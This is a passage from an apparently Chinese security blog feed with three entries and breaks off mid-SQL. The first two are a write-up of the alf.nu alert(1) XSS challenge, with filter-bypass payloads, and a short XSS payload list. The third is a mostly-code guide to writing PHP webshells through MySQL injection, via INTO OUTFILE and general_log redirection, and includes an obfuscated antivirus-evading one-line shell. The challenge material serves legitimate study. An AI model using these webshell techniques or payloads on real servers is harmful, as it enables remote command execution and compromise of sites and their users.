href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>闭合<code>&lt;script&gt;</code>标签，但是方法<code>alert(1)</code>，被转换成大写了，无法执行，尝试编码绕过。</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;img src onerror&#x3D;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function htmlEscape(s) &#123;</span><br><span class="line">    return s.replace(&#x2F;.&#x2F;g, function(x) &#123;</span><br><span class="line">       return &#123; &#39;&lt;&#39;: &#39;&lt;&#39;, &#39;&gt;&#39;: &#39;&gt;&#39;, &#39;&amp;&#39;: &#39;&amp;&#39;, &#39;&quot;&#39;: &#39;&quot;&#39;, &quot;&#39;&quot;: &#39;&#39;&#39; &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function expandTemplate(template, args) &#123;</span><br><span class="line">    return template.replace(</span><br><span class="line">        &#x2F;&#123;(\w+)&#125;&#x2F;g, </span><br><span class="line">        function(_, n) &#123; </span><br><span class="line">           return htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return expandTemplate(</span><br><span class="line">    &quot;                                                \n\</span><br><span class="line">      &lt;h2&gt;Hello, &lt;span id&#x3D;name&gt;&lt;&#x2F;span&gt;!&lt;&#x2F;h2&gt;         \n\</span><br><span class="line">      &lt;script&gt;                                       \n\</span><br><span class="line">         var v &#x3D; document.getElementById(&#39;name&#39;);    \n\</span><br><span class="line">         v.innerHTML &#x3D; &#39;&lt;a href&#x3D;#&gt;&#123;name&#125;&lt;&#x2F;a&gt;&#39;;       \n\</span><br><span class="line">      &lt;\&#x2F;script&gt;                                     \n\</span><br><span class="line">    &quot;,</span><br><span class="line">    &#123; name : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>代码对输入的<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、进行了转义，输入的字符串会拼接在<code>{name}</code>处。<br>由于没有过滤<code>\</code>，可以利用<code>JS</code>的8进制或者16进制编码来绕过。</p><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">32个字符</span><br><span class="line">\x3cimg src onerror&#x3D;alert(1)\x3e</span><br><span class="line">26个字符</span><br><span class="line">\x3cstyle&#x2F;onload&#x3D;alert(1)  &#x2F;&#x2F;末尾有一个空格</span><br></pre></td></tr></table></figure><h2 id="JSON-2"><a href="#JSON-2" class="headerlink" title="JSON 2"></a>JSON 2</h2><h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; JSON.stringify(s).replace(&#x2F;&lt;\&#x2F;script&#x2F;gi, &#39;&#39;);</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>对<code>&lt;/script</code>标签进行了过滤，由于正则中存在<code>i</code>修饰符，不区分大小写，不能使用大小写混合来绕过。</p><p>由于直接将字符串替换为空，可以双写绕过。</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;s&lt;&#x2F;scriptcript&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="Callback-2"><a href="#Callback-2" class="headerlink" title="Callback 2"></a>Callback 2</h2><h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  &#x2F;&#x2F; Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing &#x3D; s.split(&#x2F;#&#x2F;); </span><br><span class="line"></span><br><span class="line">  if (!&#x2F;^[a-zA-Z\[\]&#39;]*$&#x2F;.test(thing[0])) return &#39;Invalid callback&#39;;</span><br><span class="line">  var obj &#x3D; &#123;&#39;userdata&#39;: thing[1] &#125;;</span><br><span class="line">  var json &#x3D; JSON.stringify(obj).replace(&#x2F;\&#x2F;&#x2F;g, &#39;\\&#x2F;&#39;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>与第6题的类似，但是转义了<code>/</code>，导致<code>//</code>这个注释符无法使用，但是<code>JavaScript</code>的注释符有三种，分别是<code>//</code>、<code>/**/</code>、<code>&lt;!--</code><br>可以使用来注释。</p><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;#&#39;;alert(1)&lt;!--</span><br></pre></td></tr></table></figure><h2 id="Skandia-2"><a href="#Skandia-2" class="headerlink" title="Skandia 2"></a>Skandia 2</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (&#x2F;[&lt;&gt;]&#x2F;.test(s)) return &#39;-&#39;;</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>代码过滤了<code>&lt;</code>、<code>&gt;</code>。还将所有输入的字母变成了大写，不能借助<code>toUpperCase()</code>的特性来解了。<br>可以利用<code>jsfuck</code>。直接将<code>&quot;);alert(1)//</code>中的<code>alert(1)</code>用<code>jsfuck</code>表示。</p><p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">JSfuck</a></p><p>但是直接使用工具生成的<code>jsfuck</code>太长了，不过我们还有另一种方法，就是<code>JS</code>的匿名函数。</p><p>我们可以通过这种方法来执行任意方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&#39;map&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()</span><br></pre></td></tr></table></figure><p>由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\141\154\145\162\164(1)&#39;)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">&quotx2F;&#x2F;</span><br><span class="line">方法二</span><br><span class="line">&quot;);[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\141\154\145\162\164(1)&#39;)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var tag &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">  &#x2F;&#x2F; https:&#x2F;&#x2F;4i.am&#x2F;?...raw&#x3D;... just outputs whatever you pass in.</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">  &#x2F;&#x2F; Alerting from 4i.am won&#39;t count.</span><br><span class="line"></span><br><span class="line">  s &#x3D; &#39;&lt;script&gt;&#39; + s + &#39;&lt;\&#x2F;script&gt;&#39;;</span><br><span class="line">  tag.src &#x3D; &#39;https:&#x2F;&#x2F;4i.am&#x2F;?:XSS&#x3D;0&amp;CT&#x3D;text&#x2F;html&amp;raw&#x3D;&#39; + encodeURIComponent(s);</span><br><span class="line"></span><br><span class="line">  window.WINNING &#x3D; function() &#123; youWon &#x3D; true; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(&#39;onload&#39;, &#39;youWon &amp;&amp; alert(1)&#39;);</span><br><span class="line">  return tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>只要使<code>youWon</code>为<code>true</code>，这样就能执行<code>alert(1)</code>了。<br>解决思路是利用到<code>iframe</code>的特性，当在<code>iframe</code>中设置了一个<code>name</code>属性之后， 这个<code>name</code>属性的值就会变成<code>iframe</code>中的<code>window</code>对象的全局。</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&quot;youWon&quot;</span><br></pre></td></tr></table></figure><h2 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h2><h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function json(s) &#123; return JSON.stringify(s).replace(&#x2F;\&#x2F;&#x2F;g, &#39;\\&#x2F;&#39;); &#125;</span><br><span class="line">  function html(s) &#123; return s.replace(&#x2F;[&lt;&gt;&quot;&amp;]&#x2F;g, function(s) &#123;</span><br><span class="line">                        return &#39;&amp;#&#39; + s.charCodeAt(0) + &#39;;&#39;; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &#39;&lt;script&gt;&#39; +</span><br><span class="line">      &#39;var url &#x3D; &#39; + json(s) + &#39;; &#x2F;&#x2F; We\&#39;ll use this later &#39; +</span><br><span class="line">    &#39;&lt;&#x2F;script&gt;\n\n&#39; +</span><br><span class="line">    &#39;  &lt;!-- for debugging --&gt;\n&#39; +</span><br><span class="line">    &#39;  URL: &#39; + html(s) + &#39;\n\n&#39; +</span><br><span class="line">    &#39;&lt;!-- then suddenly --&gt;\n&#39; +</span><br><span class="line">    &#39;&lt;script&gt;\n&#39; +</span><br><span class="line">    &#39;  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#39; +</span><br><span class="line">    &#39;  else new Image().src &#x3D; url;\n&#39; +</span><br><span class="line">    &#39;&lt;&#x2F;script&gt;&#39;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>本题用到了一个小<code>trick</code>:<br><code>HTML5</code>解析器会将<code>&lt;!--&lt;script&gt;</code>到<code>&lt;/script&gt;</code>之间的任何东西都当作<code>JavaScript</code>代码处理，同时要确保代码中还有一个<code>--&gt;</code>来防止解析器报语法错误。</p><p>首先输入一个<code>&lt;!--&lt;script&gt;</code>，此时的输出中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var url &#x3D; &quot;&lt;!--&lt;script&gt;&quot;; &#x2F;&#x2F; We&#39;ll use this later &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src &#x3D; url;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这一段所有的代码都会当做<code>JS</code>执行。<br>在后面有个正则表达式<code>!/^http:.*/</code>，其中的<code>*/</code>可以当做注释，那么我们在前面再加入一个<code>/*</code>即可闭合。<br>此时的输出为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var url &#x3D; &quot;\&#x2F;*&lt;!--&lt;script&gt;&quot;; &#x2F;&#x2F; We&#39;ll use this later &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &#x2F;*&amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src &#x3D; url;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>在注释符之前添加要执行的代码就可以了。</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(alert(1)&#x2F;*&lt;!--&lt;script&gt;</span><br></pre></td></tr></table></figure><h2 id="JSON-3"><a href="#JSON-3" class="headerlink" title="JSON 3"></a>JSON 3</h2><h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    return s.split(&#39;#&#39;).map(function(v) &#123;</span><br><span class="line">        &#x2F;&#x2F; Only 20% of slashes are end tags; save 1.2% of total</span><br><span class="line">        &#x2F;&#x2F; bytes by only escaping those.</span><br><span class="line">        var json &#x3D; JSON.stringify(v).replace(&#x2F;&lt;\&#x2F;&#x2F;g, &#39;&lt;\\&#x2F;&#39;);</span><br><span class="line">        return &#39;&lt;script&gt;console.log(&#39; + json + &#39;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">    &#125;).join(&#39;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>题目思路与上一个题类似，借助<code>&lt;!--&lt;script&gt;</code>来执行JS代码，不过因为后面没有<code>--&gt;</code>，解析器会报错，需要我们在后面构造一个<code>--&gt;</code>来避免报错。</p><p>构造的<code>Payload</code>为``，此时输出为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;&lt;!--&lt;script&gt;&quot;)&lt;&#x2F;script&gt;&lt;script&gt;console.log(&quot;)&#x2F;;alert(1)&#x2F;&#x2F;--&gt;&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>其中<code>/script&gt;console.log(&quot;)/</code>被当做了正则表达式解析，后面通过分号分割后，成功执行代码<code>alert(1)</code>。</p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;script&gt;#)&#x2F;;alert(1)&#x2F;&#x2F;--&gt;</span><br></pre></td></tr></table></figure><h2 id="Skandia-3"><a href="#Skandia-3" class="headerlink" title="Skandia 3"></a>Skandia 3</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (&#x2F;[\\&lt;&gt;]&#x2F;.test(s)) return &#39;-&#39;;</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><h2 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><h2 id="Well"><a href="#Well" class="headerlink" title="Well"></a>Well</h2><h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><h2 id="No"><a href="#No" class="headerlink" title="No"></a>No</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><h2 id="K’Z’K"><a href="#K’Z’K" class="headerlink" title="K’Z’K"></a>K’Z’K</h2><h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;靶场地址：&lt;a href=&quot;https://alf.nu/alert1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;al
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://mysecroad.github.io/categories/WEB/"/>
    
    
      <category term="XSS" scheme="http://mysecroad.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS_payload收集</title>
    <link href="http://mysecroad.github.io/posts/63039.html"/>
    <id>http://mysecroad.github.io/posts/63039.html</id>
    <published>2020-05-02T12:22:34.000Z</published>
    <updated>2020-05-02T12:31:54.330Z</updated>
    
    <content type="html"><![CDATA[<p><strong>XSS弹cookie</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(docment.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>XSS弹用户信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(navigator.userAgent)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>参考</strong></p><p><a href="https://github.com/pgaijin66/XSS-Payloads" target="_blank" rel="noopener">https://github.com/pgaijin66/XSS-Payloads</a></p><p><a href="https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html" target="_blank" rel="noopener">https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html</a></p><p><a href="https://www.jianshu.com/p/01377ad556f0" target="_blank" rel="noopener">https://www.jianshu.com/p/01377ad556f0</a></p><p><a href="https://github.com/ismailtasdelen/xss-payload-list" target="_blank" rel="noopener">https://github.com/ismailtasdelen/xss-payload-list</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;XSS弹cookie&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://mysecroad.github.io/categories/WEB/"/>
    
    
      <category term="XSS" scheme="http://mysecroad.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>MySql注入点写webshell</title>
    <link href="http://mysecroad.github.io/posts/23798.html"/>
    <id>http://mysecroad.github.io/posts/23798.html</id>
    <published>2020-04-29T11:27:37.000Z</published>
    <updated>2020-04-29T13:11:41.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过<code>mysql</code>插入一条<code>php</code>代码记录输出到<code>http</code>服务器工作目录下，通过<code>url</code>传参来交给<code>php</code>系统命令函数来执行获取返回结果，若权限等足够可以直接创建新的账号密码来远程登录</p><p>可以先查看一下<code>mysql</code>的能写的文件 <code>secure_file_priv</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;%secure%&#39;;</span><br><span class="line">secure_file_priv的值为null，表示限制mysqld不允许导入&#x2F;导出</span><br><span class="line">secure_file_priv的值为D:&#x2F;，表示限制mysqld的导入&#x2F;导出只能发生在D盘目录下</span><br><span class="line">secure_file_priv没有具体值时，表示不对mysqld的导入&#x2F;导出做限制</span><br></pre></td></tr></table></figure><h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>对<code>web</code>目录有写权限</li><li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>没有配置<code>secure-file-priv</code></li></ul><h3 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h3><ul><li>有<code>union</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php assert($_POST["cmd"]); ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/home/wwwroot/default/shell.php'</span></span><br></pre></td></tr></table></figure><ul><li>无<code>union</code></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">into outfile '/home/wwwroot/default/shell.php' fields terminated by '&lt;?php assert($_POST["cmd"]);?&gt;'</span><br></pre></td></tr></table></figure><h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><p>新版本的<code>MySQL</code>设置了导出文件的路径，很难在获取<code>Webshell</code>过程中去修改配置文件，无法通过使用<code>select into outfile</code>来写入一句话。这时，我们可以通过修改<code>MySQL</code>的<code>log</code>文件来获取<code>Webshell</code>。</p><h3 id="使用条件-1"><a href="#使用条件-1" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>对<code>web</code>目录有写权限</li><li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>需要能执行多行SQL语句</li></ul><h3 id="姿势-1"><a href="#姿势-1" class="headerlink" title="姿势"></a>姿势</h3><h4 id="常用方式"><a href="#常用方式" class="headerlink" title="常用方式"></a>常用方式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;             <span class="comment">#查看配置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;                 <span class="comment">#开启general log模式</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'E:/study/WWW/evil.php'</span>; <span class="comment">#设置日志目录为shell地址</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_GET[g]);?&gt;'</span>             <span class="comment">#写入shell</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">off</span>;                  <span class="comment">#关闭general log模式</span></span><br></pre></td></tr></table></figure><h4 id="免杀shell"><a href="#免杀shell" class="headerlink" title="免杀shell"></a>免杀shell</h4><p>一句话webshell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['cmd']));?&gt;"</span></span><br></pre></td></tr></table></figure><p>创建数据表，写入webshell后删除数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`mysql`</span>.<span class="string">`antian365`</span> (<span class="string">`temp`</span> <span class="built_in">TEXT</span> <span class="keyword">NOTNULL</span> );</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`mysql`</span>.<span class="string">`antian365`</span> (<span class="string">`temp`</span> ) <span class="keyword">VALUES</span>(<span class="string">'&lt;?php @eval($_POST[antian365]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span 